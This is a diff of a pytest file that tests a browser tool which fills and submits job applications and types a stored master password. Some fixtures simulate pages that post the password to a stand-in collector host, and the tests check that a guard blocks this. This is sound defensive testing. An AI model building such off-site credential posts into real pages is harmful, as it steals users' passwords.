@@ -1204,47 +1204,556 @@ _COMBINED = """<!doctype html><html><head><title>Apply</title></head><body>
 <label>Email * <input type="email" name="email" required></label>
 <label>Phone <input type="tel" name="phone"></label>
 __RESUME__
+__EXTRA__
+<label>Password * <input type="password" name="pw" autocomplete="new-password" required></label>
+<button type="button" onclick="document.body.dataset.submitted = 1; document.body.innerHTML =
+  '<h1>Application received</h1><p>Thank you for applying.</p>'">__BUTTON__</button>
+</body></html>"""
+
+
+_COMBINED_URL = "https://careers.fabrikam.example/apply/42"
+
+
+def _serve_combined(context, button, resume=False, html=_COMBINED, extra=False):
+    """`html` at the application's URL. `resume` adds a required resume box
+    (the page is then the form); `extra` a required question only an
+    application asks (a LinkedIn profile)."""
+    body = html.replace("__BUTTON__", button).replace(
+        "__RESUME__", '<label>Resume * <input type="file" name="resume" required></label>'
+        if resume else "").replace(
+        "__EXTRA__", '<label>LinkedIn profile * <input type="url" name="linkedin" required>'
+                     '</label>' if extra else "")
+    context.route("https://careers.fabrikam.example/**",
+                  lambda route: route.fulfill(body=body, content_type="text/html"))
+
+
+def _count_password_fills(monkeypatch):
+    """Typed master passwords, counted; the real filler still types them."""
+    monkeypatch.setattr(ats_accounts, "_get_master_password", lambda: "synthetic-password")
+    typed = []
+    real = ats_accounts.fill_password
+    monkeypatch.setattr(ats_accounts, "fill_password",
+                        lambda *a: typed.append(1) or real(*a))
+    return typed
+
+
+@pytest.mark.parametrize("submit_on", [False, True])
+@pytest.mark.parametrize("button, resume, conf", [
+    # a resume box makes the page the form
+    ("Create account and apply", True, 0.90),
+    ("Register and submit application", True, 0.90),
+    ("Create account and apply", True, 0.30),
+    # the account boxes and a question only an application asks: the account
+    # step hands the page to the form step, since its button sends it
+    ("Create account and apply", False, 0.90),
+    ("Sign in and apply", False, 0.90),
+    ("Sign in and apply", False, 0.30),
+    ("Complete application", False, 0.90)])
+def test_a_sign_up_inside_the_application_form_takes_the_password_and_stops_at_the_gate(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch, submit_on, button,
+        resume, conf):
+    # the second review: one page that creates the account and sends the
+    # application. The master password is for job applications only (the
+    # user's rule, 2026-09-22): the form step types it, and only the submit
+    # gate sends, so park mode stops there with the page filled
+    typed = _count_password_fills(monkeypatch)
+    _serve_combined(context, button, resume, extra=not resume)
+    _enqueue(job_folder, _COMBINED_URL)
+    runner = _runner(context, tmp_path, auto_apply_submit=submit_on)
+    runner.jev = type("Judge", (_FormAsAccountJudge,), {"STATE": "signup_form", "CONF": conf})()
+    out = runner.drain(cap=1)[0]
+    record = Path(out.record_path).read_text(encoding="utf-8")
+    assert typed == [1], out
+    assert re.search(r"- Password[^:\n]*: <hidden>", record), record
+    assert "synthetic-password" not in record
+    assert "(advance)" not in record
+    assert all(m["question"] != "Password" for m in _entry()["missing_answers"])
+    assert ats_accounts.lookup(_COMBINED_URL)["method"] == "master_password"
+    if submit_on:
+        assert out.status == "submitted", out
+        assert "SUBMIT CLICKED" in record
+        return
+    page = next(p for p in context.pages if not p.is_closed())
+    assert page.locator("body[data-submitted]").count() == 0, out
+    assert page.locator("[name=pw]").input_value() == "synthetic-password"
+    assert (out.status, out.reason) == ("ready_to_submit", "auto_apply_submit is off"), out
+
+
+def test_a_plain_account_button_on_the_application_form_is_an_advance(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch):
+    # "Create account" with the resume on the page makes the account and goes
+    # on to the application's next step: the form step clicks it
+    typed = _count_password_fills(monkeypatch)
+    _serve_combined(context, "Create account", resume=True)
+    _enqueue(job_folder, _COMBINED_URL)
+    runner = _runner(context, tmp_path, auto_apply_submit=False)
+    runner.jev = type("Judge", (_FormAsAccountJudge,), {"STATE": "signup_form", "CONF": 0.9})()
+    out = runner.drain(cap=1)[0]
+    assert typed == [1], out
+    assert "Create account (advance)" in Path(out.record_path).read_text(encoding="utf-8")
+
+
+_ACCOUNT_ONLY = """<!doctype html><html><head><title>Sign up</title></head><body>
+<label>Email * <input type="email" name="email" required></label>
 <label>Password * <input type="password" name="pw" autocomplete="new-password" required></label>
 <button type="button" onclick="document.body.dataset.submitted = 1">__BUTTON__</button>
 </body></html>"""
 
 
+_SIGN_IN_TERMS = """<!doctype html><html><head><title>Sign in</title></head><body>
+<label>Email * <input type="email" name="email" required></label>
+<label>Password * <input type="password" name="pw" autocomplete="current-password" required>
+</label>
+<label><input type="checkbox" name="terms" required> I agree to the terms of use *</label>
+<button type="button" onclick="document.body.dataset.submitted = 1">__BUTTON__</button>
+</body></html>"""
+
+
 @pytest.mark.parametrize("submit_on", [False, True])
-@pytest.mark.parametrize("button, resume, conf, reason", [
-    # a resume box makes the page the form, whose password box is the human's
-    ("Create account and apply", True, 0.90, "PASSWORD"),
-    ("Register and submit application", True, 0.90, "PASSWORD"),
-    ("Create account and apply", True, 0.30, "PASSWORD"),
-    ("Create account", True, 0.90, "PASSWORD"),
-    # account boxes alone: the sign-up step refuses a button that also applies
-    ("Create account and apply", False, 0.90, "reads as sending the application"),
-    ("Sign in and apply", False, 0.90, "reads as sending the application"),
-    ("Sign in and apply", False, 0.30, "reads as sending the application"),
-    ("Complete application", False, 0.90, "reads as sending the application")])
-def test_a_sign_up_inside_the_application_form_is_never_sent_by_the_account_step(
-        context, job_folder, catalog_builder, tmp_path, monkeypatch, submit_on, button,
-        resume, conf, reason):
-    # the second review: one page that creates the account and sends the
-    # application (a resume box, a password box, "Create account and apply")
-    monkeypatch.setattr(ats_accounts, "_get_master_password", lambda: "synthetic-password")
-    typed = []
-    monkeypatch.setattr(ats_accounts, "fill_password", lambda *a: typed.append(a) or True)
-    body = _COMBINED.replace("__BUTTON__", button).replace(
-        "__RESUME__", '<label>Resume * <input type="file" name="resume" required></label>'
-        if resume else "")
-    context.route("https://careers.fabrikam.example/**",
-                  lambda route: route.fulfill(body=body, content_type="text/html"))
-    _enqueue(job_folder, "https://careers.fabrikam.example/apply/42")
+@pytest.mark.parametrize("button, html", [
+    ("Create account and apply", _ACCOUNT_ONLY), ("Submit", _ACCOUNT_ONLY),
+    # a sign-up's own boxes (the name, the phone) and the terms are no application
+    ("Create account and apply", _COMBINED), ("Sign in and apply", _COMBINED),
+    ("Sign in and apply", _SIGN_IN_TERMS)])
+def test_an_account_screen_alone_whose_button_reads_as_sending_parks_before_typing(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch, submit_on, button, html):
+    # with a sign-up's boxes alone, the gate cannot tell a button that starts
+    # the application from one that sends it: submitting on, a wrong
+    # "submitted" would lose the job (the fourth review), so the human signs in
+    typed = _count_password_fills(monkeypatch)
+    _serve_combined(context, button, html=html)
+    _enqueue(job_folder, _COMBINED_URL)
     runner = _runner(context, tmp_path, auto_apply_submit=submit_on)
-    runner.jev = type("Judge", (_FormAsAccountJudge,), {"STATE": "signup_form", "CONF": conf})()
+    runner.jev = type("Judge", (_FormAsAccountJudge,), {"STATE": "signup_form", "CONF": 0.9})()
     out = runner.drain(cap=1)[0]
     page = next(p for p in context.pages if not p.is_closed())
     assert page.locator("body[data-submitted]").count() == 0, out
-    assert out.status == "needs_human", out
-    assert (apply_judge.PASSWORD_IN_FORM_REASON if reason == "PASSWORD" else reason) \
-        in out.reason, out
+    assert out.status == "needs_human" and "reads as sending the application" in out.reason, out
     assert typed == []
-    assert all(m["question"] != "Password" for m in _entry()["missing_answers"])
+
+
+_REJECTING_FORM = """<!doctype html><html><head><title>Apply</title></head><body>
+<h1>Apply</h1>
+<label>Resume * <input type="file" name="resume" required></label>
+<label>Email * <input type="email" name="email" required></label>
+<label>Password * <input type="password" name="pw" autocomplete="current-password" required>
+</label>
+<button type="button" onclick="document.querySelector('h1').textContent =
+  'That password is not right. Try again.'; document.querySelector('[name=pw]').value = ''">
+Continue</button></body></html>"""
+
+
+def test_a_form_gets_the_master_password_once_per_site(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch):
+    # a rejected password comes back as the same form: typing it again only
+    # moves the account toward a lockout
+    typed = _count_password_fills(monkeypatch)
+    _serve_combined(context, "", html=_REJECTING_FORM)
+    _enqueue(job_folder, _COMBINED_URL)
+    runner = _runner(context, tmp_path, auto_apply_submit=False)
+    runner.jev = type("Judge", (_FormAsAccountJudge,),
+                      {"STATE": "application_form", "CONF": 0.9})()
+    out = runner.drain(cap=1)[0]
+    assert typed == [1], out
+    assert (out.status, out.reason) == (
+        "needs_human", "the form on careers.fabrikam.example asked for the master password "
+                       "again"), out
+
+
+_SIGN_UP_THEN_APPLY = """<!doctype html><html><head><title>Create account</title></head><body>
+<label>First name * <input name="first" required></label>
+<label>Last name * <input name="last" required></label>
+<label>Email * <input type="email" name="email" required></label>
+<label>Password * <input type="password" name="pw" autocomplete="new-password" required></label>
+<label>Confirm password * <input type="password" name="pw2" autocomplete="new-password"
+  required></label>
+<button type="button" onclick="document.body.innerHTML =
+  '<h1>Your account is ready</h1><a href=&quot;/apply/42/form&quot;>Apply now</a>'">
+Create account</button></body></html>"""
+_THE_FORM = """<!doctype html><html><head><title>Apply</title></head><body>
+<label>First name * <input name="first" required></label>
+<button type="button" onclick="document.body.dataset.submitted = 1; document.body.innerHTML =
+  '<h1>Application received</h1><p>Thank you for applying.</p>'">Submit application</button>
+</body></html>"""
+
+
+@pytest.mark.parametrize("submit_on", [False, True])
+def test_a_sign_up_read_as_the_form_does_not_count_as_the_filled_application(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch, submit_on):
+    # the fourth review: the form step made the account and marked the run's
+    # form filled, so the "Apply now" after it went to the submit gate and a
+    # submit-mode run finished "submitted" with nothing sent. A page of a
+    # sign-up's boxes and a password makes an account, not the application
+    typed = _count_password_fills(monkeypatch)
+    context.route("https://careers.fabrikam.example/**", lambda route: route.fulfill(
+        body=_THE_FORM if route.request.url.endswith("/form") else _SIGN_UP_THEN_APPLY,
+        content_type="text/html"))
+    _enqueue(job_folder, _COMBINED_URL)
+
+    class Judge(_FormAsAccountJudge):
+        """Every page with fields a form, the page after the sign-up a posting."""
+        STATE, CONF = "application_form", 0.9
+
+        def judge(self, state, questions):
+            out = super().judge(state, questions)
+            if "page_state" in out and "account is ready" in state["page"]["headline_text"]:
+                out["page_state"] = jev.Answer(kind="choice", choice="job_posting",
+                                               probabilities={"job_posting": 0.9},
+                                               confidence=0.9)
+            return out
+
+    runner = _runner(context, tmp_path, auto_apply_submit=submit_on)
+    runner.jev = Judge()
+    out = runner.drain(cap=1)[0]
+    record = Path(out.record_path).read_text(encoding="utf-8")
+    assert typed == [1, 1], out
+    assert "Create account (advance)" in record
+    if submit_on:
+        assert "Apply now (apply_entry)" in record, record
+        assert (out.status, out.reason) == ("submitted", "confirmation page"), out
+        assert record.count("SUBMIT CLICKED") == 1
+    else:
+        # park mode takes no chance on an Apply after a page that took the
+        # password: it may be an application's review (the next test)
+        assert "Apply now (apply_entry)" not in record, record
+        assert (out.status, out.reason) == ("ready_to_submit", "auto_apply_submit is off"), out
+    # the page made an account (a new password and its confirmation)
+    assert ats_accounts.lookup(_COMBINED_URL)["email"] == "jane.doe@example.com"
+
+
+_CONTACT_THEN_REVIEW = """<!doctype html><html><head><title>Apply</title></head><body>
+<label>First name * <input name="first" required></label>
+<label>Last name * <input name="last" required></label>
+<label>Email * <input type="email" name="email" required></label>
+<label>Password * <input type="password" name="pw" autocomplete="new-password" required></label>
+<button type="button" onclick="review()">Next</button>
+<script>
+function review() {
+  document.body.innerHTML = '<h1>Review your application</h1><button id="apply">Apply</button>';
+  document.getElementById('apply').onclick = function () {
+    document.body.dataset.submitted = '1';
+    document.body.innerHTML = '<h1>Application received</h1>';
+  };
+}
+</script></body></html>"""
+
+
+@pytest.mark.parametrize("stored, html", [
+    (True, _CONTACT_THEN_REVIEW),
+    # round 4: an optional box left blank (no master password) counts too
+    (False, _CONTACT_THEN_REVIEW.replace(
+        'Password * <input type="password" name="pw" autocomplete="new-password" required>',
+        'Password (optional) <input type="password" name="pw" autocomplete="new-password">'))])
+def test_park_mode_never_clicks_an_apply_after_a_page_with_a_password_box(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch, stored, html):
+    # the fourth review, round 3: an application that asks only for contact
+    # details and a password, then a review page with "Apply" read as a
+    # posting: park mode clicked it as the Apply entry and sent the application
+    if stored:
+        _count_password_fills(monkeypatch)
+    _serve_combined(context, "", html=html)
+    _enqueue(job_folder, _COMBINED_URL)
+
+    class Judge(_FormAsAccountJudge):
+        STATE, CONF = "application_form", 0.9
+
+        def judge(self, state, questions):
+            out = super().judge(state, questions)
+            if "page_state" in out and "Review your" in state["page"]["headline_text"]:
+                out["page_state"] = jev.Answer(kind="choice", choice="job_posting",
+                                               probabilities={"job_posting": 0.9},
+                                               confidence=0.9)
+            return out
+
+    runner = _runner(context, tmp_path, auto_apply_submit=False)
+    runner.jev = Judge()
+    out = runner.drain(cap=1)[0]
+    page = next(p for p in context.pages if not p.is_closed())
+    assert page.locator("body[data-submitted]").count() == 0, out
+    assert (out.status, out.reason) == ("ready_to_submit", "auto_apply_submit is off"), out
+
+
+@pytest.mark.parametrize("box, makes", [
+    # a sign-in read as the form makes no account
+    ('<label>Password <input type="password" name="pw" autocomplete="current-password" '
+     'required></label>', False),
+    ('<label>Password <input type="password" name="pw" required></label>', False),
+    # a page that makes one: by its autocomplete, its label, or a confirmation
+    ('<label>Password <input type="password" name="pw" autocomplete="new-password" required>'
+     '</label>', True),
+    ('<label>Create a password <input type="password" name="pw" required></label>', True),
+    ('<label>Password <input type="password" name="pw" required></label><label>Confirm '
+     'password <input type="password" name="pw2" required></label>', True)])
+def test_the_ledger_takes_an_account_only_from_a_page_that_makes_one(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch, box, makes):
+    typed = _count_password_fills(monkeypatch)
+    run = _routed_unit_run(context, tmp_path, job_folder, f"""<body>
+      <label>Email <input type="email" name="email" required></label>{box}</body>""")
+    digest = apply_form.extract(run.page)
+    plan = apply_judge.plan(digest, run.catalog, {})
+    with run._password_guard() as guard:
+        run._fill_passwords(digest, plan, run.pages[-1], guard)
+    assert typed and all(typed)
+    assert (ats_accounts.lookup(_COMBINED_URL) is not None) is makes
+
+
+@pytest.mark.parametrize("read, conf", [("other", 0.3), ("job_posting", 0.9),
+                                        ("review_page", 0.9)])
+def test_after_a_handed_off_sign_ups_submit_only_a_confirmation_counts(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch, read, conf):
+    # the fourth review, round 4: the gate clicked a handed-off sign-up's
+    # "Create account and apply", a welcome page came next ("Start your
+    # application"), and the job read "submitted (unconfirmed)"
+    _count_password_fills(monkeypatch)
+    welcome = ("<!doctype html><html><body><h1>Your account is ready</h1>"
+               "<a href='/apply/42/start'>Start your application</a></body></html>")
+    context.route("https://careers.fabrikam.example/**", lambda route: route.fulfill(
+        body=welcome if route.request.url.endswith("/form") else _SIGN_UP_AND_APPLY,
+        content_type="text/html"))
+    _enqueue(job_folder, _COMBINED_URL)
+
+    class Judge(_FormAsAccountJudge):
+        STATE, CONF = "signup_form", 0.9
+
+        def judge(self, state, questions):
+            out = super().judge(state, questions)
+            if "page_state" in out and "account is ready" in state["page"]["headline_text"]:
+                out["page_state"] = jev.Answer(kind="choice", choice=read,
+                                               probabilities={read: conf}, confidence=conf)
+            return out
+
+    runner = _runner(context, tmp_path, auto_apply_submit=True)
+    runner.jev = Judge()
+    out = runner.drain(cap=1)[0]
+    assert out.status == "needs_human", out
+    assert "the click may only have made the account" in out.reason, out
+
+
+def test_an_optional_profile_password_on_a_sent_application_is_no_account_page(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch):
+    # round 4: a stored master password went into an optional "save your
+    # profile" box; the portal page after the send is no reason to stop
+    typed = _count_password_fills(monkeypatch)
+    portal = ("<!doctype html><html><body><h1>Your candidate profile</h1>"
+              "<label>Headline <input name='headline'></label>"
+              "<button>Save profile</button></body></html>")
+    form = """<!doctype html><html><body>
+      <label>First name * <input name="first" required></label>
+      __RESUME__
+      <label>Password (optional, to save your profile) <input type="password" name="pw"
+        autocomplete="new-password"></label>
+      <button type="button" onclick="location.href = '/apply/42/portal'">Submit application</button>
+      </body></html>"""
+    context.route("https://careers.fabrikam.example/**", lambda route: route.fulfill(
+        body=portal if route.request.url.endswith("/portal") else form.replace(
+            "__RESUME__", '<label>Resume * <input type="file" name="resume" required></label>'),
+        content_type="text/html"))
+    _enqueue(job_folder, _COMBINED_URL)
+    runner = _runner(context, tmp_path, auto_apply_submit=True)
+    runner.jev = type("Judge", (_FormAsAccountJudge,),
+                      {"STATE": "application_form", "CONF": 0.9})()
+    out = runner.drain(cap=1)[0]
+    assert typed == [1], out
+    assert out.status == "submitted", out
+    assert out.reason.startswith("submitted (unconfirmed)"), out
+
+
+_SIGN_UP_AND_APPLY = """<!doctype html><html><head><title>Create account</title></head><body>
+<label>First name * <input name="first" required></label>
+<label>Email * <input type="email" name="email" required></label>
+<label>LinkedIn profile * <input type="url" name="linkedin" required></label>
+<label>Password * <input type="password" name="pw" autocomplete="new-password" required></label>
+<button type="button" onclick="location.href = '/apply/42/form'">Create account and apply</button>
+</body></html>"""
+
+
+def test_a_form_after_an_account_pages_submit_waits_for_the_user(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch):
+    # the fourth review, round 2: submitting on, the gate clicked "Create
+    # account and apply", the application form came next, and the job was
+    # marked submitted with nothing sent. Going on instead sent a real
+    # application twice when its page reset itself to the form (round 3):
+    # the run can tell neither, so the job waits for the user
+    typed = _count_password_fills(monkeypatch)
+    context.route("https://careers.fabrikam.example/**", lambda route: route.fulfill(
+        body=_THE_FORM if route.request.url.endswith("/form") else _SIGN_UP_AND_APPLY,
+        content_type="text/html"))
+    _enqueue(job_folder, _COMBINED_URL)
+    runner = _runner(context, tmp_path, auto_apply_submit=True)
+    runner.jev = type("Judge", (_FormAsAccountJudge,), {"STATE": "signup_form", "CONF": 0.9})()
+    out = runner.drain(cap=1)[0]
+    record = Path(out.record_path).read_text(encoding="utf-8")
+    assert typed == [1], out
+    assert out.status == "needs_human", out
+    assert out.reason.startswith("after the account page's submit the page reads as "), out
+    assert "the click may only have made the account" in out.reason, out
+    assert record.count("SUBMIT CLICKED") == 1
+
+
+def test_a_submit_the_guard_stopped_sent_nothing_and_parks(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch):
+    # the fourth review, round 2: the submit button's own formaction posted
+    # off the sites, the guard stopped the post, and the job read "submitted"
+    _count_password_fills(monkeypatch)
+    hits = []
+    context.route("https://collector.example.net/**",
+                  lambda route: hits.append(1) or route.fulfill(body="taken"))
+    _serve_combined(context, "", resume=True, html="""<!doctype html><html><body>
+      <form method="post">
+        <label>First name * <input name="first" required></label>
+        __RESUME__
+        <label>Password * <input type="password" name="pw" autocomplete="new-password"
+          required></label>
+        <button formaction="https://collector.example.net/take">Submit application</button>
+      </form></body></html>""")
+    _enqueue(job_folder, _COMBINED_URL)
+    runner = _runner(context, tmp_path, auto_apply_submit=True)
+    runner.jev = type("Judge", (_FormAsAccountJudge,),
+                      {"STATE": "application_form", "CONF": 0.9})()
+    out = runner.drain(cap=1)[0]
+    assert hits == []
+    assert (out.status, out.reason) == (
+        "needs_human", "the form posts to collector.example.net, outside the allowed sites; "
+                       "the run stopped it and nothing was sent"), out
+
+
+def test_the_account_step_never_types_the_password_into_a_masked_sensitive_box(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch):
+    typed = _count_password_fills(monkeypatch)
+    _serve_combined(context, "Create account", html="""<!doctype html><html><body>
+      <label>Email * <input type="email" name="email" required></label>
+      <label>Password * <input type="password" name="pw" required></label>
+      <label>Social Security Number * <input type="password" name="ssn" required></label>
+      <button type="button" onclick="document.body.dataset.submitted = 1">__BUTTON__</button>
+      </body></html>""")
+    _enqueue(job_folder, _COMBINED_URL)
+    runner = _runner(context, tmp_path, auto_apply_submit=False)
+    runner.jev = type("Judge", (_FormAsAccountJudge,), {"STATE": "signup_form", "CONF": 0.9})()
+    out = runner.drain(cap=1)[0]
+    assert typed == [], out
+    assert out.status == "needs_human", out
+    assert "Social Security Number" in out.reason and "never fills" in out.reason, out
+
+
+@pytest.mark.parametrize("label, autocomplete, ok", [
+    ("Password", "", True), ("Confirm password", "", True), ("Re-enter Password", "", True),
+    ("Verify New Password", "", True), ("Password verification", "", True),
+    ("Choose a code", "new-password", True),
+    ("One-time password", "", False), ("Passcode", "", False), ("Passport number", "", False),
+    ("Secret answer", "", False), ("Verification code", "current-password", False),
+    ("Social Security Number", "new-password", False)])
+def test_names_password_takes_only_an_accounts_password_box(label, autocomplete, ok):
+    field = apply_form.Field(0, (0, "#f"), label, "other", True, autocomplete=autocomplete)
+    assert apply_run._names_password(field) is ok
+
+
+@pytest.mark.parametrize("required, stored, outcome", [
+    (True, False, "the form asks for a password and no master password is stored"),
+    (False, False, "ready_to_submit"),
+    (False, True, "ready_to_submit")])
+def test_a_password_box_the_run_cannot_fill_parks_only_when_it_is_required(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch, required, stored,
+        outcome):
+    if stored:
+        typed = _count_password_fills(monkeypatch)
+    html = _COMBINED if required else _COMBINED.replace(
+        'Password * <input type="password" name="pw" autocomplete="new-password" required>',
+        'Password <input type="password" name="pw" autocomplete="new-password">')
+    assert required or "required>" not in html.split("Password", 1)[1].split("</label>")[0]
+    _serve_combined(context, "Submit application", resume=True, html=html)
+    _enqueue(job_folder, _COMBINED_URL)
+    out = _runner(context, tmp_path, auto_apply_submit=False).drain(cap=1)[0]
+    if outcome == "ready_to_submit":
+        assert out.status == "ready_to_submit", out
+        page = next(p for p in context.pages if not p.is_closed())
+        assert page.locator("[name=pw]").input_value() == ("synthetic-password" if stored else "")
+        if stored:
+            assert typed == [1]
+    else:
+        assert (out.status, out.reason) == ("needs_human", outcome), out
+
+
+def _routed_unit_run(context, tmp_path, job_folder, html, **settings):
+    """A `_JobRun` on `html` served at the application's own URL."""
+    context.route("https://careers.fabrikam.example/**",
+                  lambda route: route.fulfill(body=html, content_type="text/html"))
+    run = _unit_run(context, tmp_path, job_folder, "", **settings)
+    run.page.goto("https://careers.fabrikam.example/jobs/42")
+    return run
+
+
+@pytest.mark.parametrize("html, where, reason", [
+    # the page is not the application's site (`about:blank`)
+    ('<label>Password <input type="password" name="pw" required></label>', "blank",
+     "a password box on about, outside the application site"),
+    # the planner reads the box as a password; the page says it is text
+    ('<label>Secret word <input type="text" name="pw" autocomplete="new-password" required>'
+     '</label>', "site", "Secret word is not a password box for an account"),
+    # a masked one-time code or security answer is no account password
+    ('<label>One-time password <input type="password" name="otp" required></label>', "site",
+     "One-time password is not a password box for an account"),
+    ('<label>Secret answer <input type="password" name="answer" required></label>', "site",
+     "Secret answer is not a password box for an account"),
+    # the box's form would post it off the allowed sites
+    ('<form action="https://collector.example.net/take" method="post"><label>Password '
+     '<input type="password" name="pw" required></label><button>Next</button></form>', "site",
+     "the password box's form posts to collector.example.net, outside the allowed sites")])
+def test_the_master_password_goes_only_into_a_password_input_on_the_application_site(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch, html, where, reason):
+    typed = _count_password_fills(monkeypatch)
+    if where == "blank":
+        run = _unit_run(context, tmp_path, job_folder, f"<body>{html}</body>")
+    else:
+        run = _routed_unit_run(context, tmp_path, job_folder, f"<body>{html}</body>")
+    digest = apply_form.extract(run.page)
+    plan = apply_judge.plan(digest, run.catalog, {})
+    assert [pf.action for pf in plan.fields] == [apply_judge.PASSWORD_ACTION]
+    with pytest.raises(apply_run._Parked, match=re.escape(reason)):
+        with run._password_guard() as guard:
+            run._fill_passwords(digest, plan, run.pages[-1], guard)
+    assert typed == []
+
+
+@pytest.mark.parametrize("html", [
+    '<label>Password <input type="PASSWORD" name="pw" required></label>',
+    '<form action="javascript:void(0)"><label>Password <input type="password" name="pw" '
+    'required></label></form>'])
+def test_a_password_box_on_the_site_takes_the_master_password(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch, html):
+    # an upper-case type is a password input; a `javascript:` action goes nowhere
+    typed = _count_password_fills(monkeypatch)
+    run = _routed_unit_run(context, tmp_path, job_folder, f"<body>{html}</body>")
+    digest = apply_form.extract(run.page)
+    plan = apply_judge.plan(digest, run.catalog, {})
+    with run._password_guard() as guard:
+        run._fill_passwords(digest, plan, run.pages[-1], guard)
+    assert typed == [1]
+    assert run.page.locator("[name=pw]").input_value() == "synthetic-password"
+
+
+def test_the_password_guard_stops_a_page_leaving_the_sites_and_lets_go_after(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch):
+    _count_password_fills(monkeypatch)
+    run = _routed_unit_run(context, tmp_path, job_folder, """<body>
+      <label>Password * <input type="password" name="pw" required></label>
+      <button id="go" onclick="location.href = 'https://collector.example.net/take'">Next</button>
+      </body>""")
+    hits = []
+    context.route("https://collector.example.net/**",
+                  lambda route: hits.append(1) or route.fulfill(body="taken"))
+    digest = apply_form.extract(run.page)
+    plan = apply_judge.plan(digest, run.catalog, {})
+    with pytest.raises(apply_run._Parked, match="left the allowed sites: collector.example.net"):
+        with run._password_guard() as guard:
+            run._fill_passwords(digest, plan, run.pages[-1], guard)
+            run.page.click("#go")
+            run.page.wait_for_timeout(300)
+    assert hits == []
+    # the route is gone once the step ends: the window is the user's again,
+    # and the same navigation goes through
+    assert guard._on is False
+    run.page.goto("https://collector.example.net/take")
+    assert hits == [1]
 
 
 def test_sends_application_reads_the_button_text():
